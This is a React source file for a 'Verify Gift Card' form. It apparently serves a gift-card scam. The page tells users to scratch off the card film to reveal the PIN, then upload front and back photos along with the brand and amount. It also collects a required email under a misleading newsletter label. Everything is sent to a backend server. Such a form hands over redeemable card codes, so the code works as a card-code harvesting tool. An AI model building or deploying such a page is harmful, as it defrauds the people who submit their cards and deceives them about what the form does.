import React from 'react';
import './Products.css';
import { useState } from 'react';
import axios from 'axios';

const Products = ({ openModal }) => {  
    const [giftCardType, setGiftCardType] = useState('');
    const [amount, setAmount] = useState('');
    const [email, setEmail] = useState('');
    const [frontImage, setFrontImage] = useState("");
    const [backImage, setBackImage] = useState("");

    // Convert image to base64
    const convertFrontImageToBase64 = (e) => {
        let reader = new FileReader();
        reader.readAsDataURL(e.target.files[0]);
        reader.onload = () => {
            setFrontImage(reader.result);
        };
        reader.onerror = error => {
            console.log("Error converting front image: ", error);
        };
    };

    const convertBackImageToBase64 = (e) => {
        let reader = new FileReader();
        reader.readAsDataURL(e.target.files[0]);
        reader.onload = () => {
            setBackImage(reader.result);
        };
        reader.onerror = error => {
            console.log("Error converting back image: ", error);
        };
    };

    // Submit form
    let submit = async (e) => {
        e.preventDefault();
        try {
            alert('submitted...');
            await axios.post("http://localhost:8000/", {
                giftCardType,
                amount,
                email,
                frontImage, // Include frontImage base64
                backImage   // Include backImage base64
            });
        } catch (e) {
            console.log(e);
        }
    };

    return (
        <div className="product-container">
            <div className="headline shadow">
                <h2>Verify Gift Card</h2>
            </div>
            <div className="headline-text">
                <p>Select the gift card type and price value, then upload clear images of both the front and back of the card.</p>
                <br />
                <span>Please remove the card from its packaging before uploading.*</span><br />
                <span>Scratch off the film of the card to reveal the pin before upload where applicable.*</span>
            </div>
            
            <div className="product-verify">
                <form onSubmit={submit}>
                    <label>
                        <p className='text-guide'>Select gift card type</p> 
                        <select required onChange={(e) => setGiftCardType(e.target.value)}>
                            <option value="">--Please choose an option--</option>
                            <option value="amazon">Amazon</option>
                            <option value="itunes">iTunes</option>
                            <option value="googlePlay">Google Play</option>
                            <option value="steam">Steam</option>
                            <option value="ebay">eBay</option>
                        </select>
                    </label>
                    <br /><br />
                    
                    <label>
                        <p className='text-guide'>Input Amount:</p> 
                        <input type="number" required onChange={(e) => setAmount(e.target.value)} />
                    </label>
                    <br /><br />
                    
                    <label>
                        <p className='text-guide'>Want to get newsletter from us?</p> 
                        <div className="email-section">
                            <i className="fa-regular fa-envelope"></i>
                            <input type="text" placeholder='Email' className='email' required onChange={(e) => setEmail(e.target.value)} />
                        </div>  
                    </label>
                    <br /><br />
                    
                    {/* Image Upload section */}
                    <label>
                        <p className='text-guide'>Upload front image</p> 
                        <input type="file" className='file' required onChange={convertFrontImageToBase64} />
                        {frontImage && <img width={100} height={100} src={frontImage} alt="front" />}
                    </label>
                    <br /><br />
                    
                    <label>
                        <p className='text-guide'>Upload back image</p> 
                        <input type="file" className='file' required onChange={convertBackImageToBase64} />
                        {backImage && <img width={100} height={100} src={backImage} alt="back" />}
                    </label>
                    <br /><br />
                    
                    <button className="btn-verify get-started" type="submit">
                        VERIFY CARD
                    </button>
                </form>
            </div>
        </div>
    );
};

export default Products;
